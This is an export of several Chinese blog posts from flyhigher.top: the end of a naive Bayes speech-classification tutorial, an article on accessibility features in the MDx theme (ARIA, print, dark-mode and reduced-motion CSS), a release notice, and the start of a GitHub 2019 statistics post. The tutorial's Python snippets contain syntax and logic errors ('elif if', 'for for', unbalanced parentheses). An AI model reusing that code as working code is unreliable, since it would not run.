的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 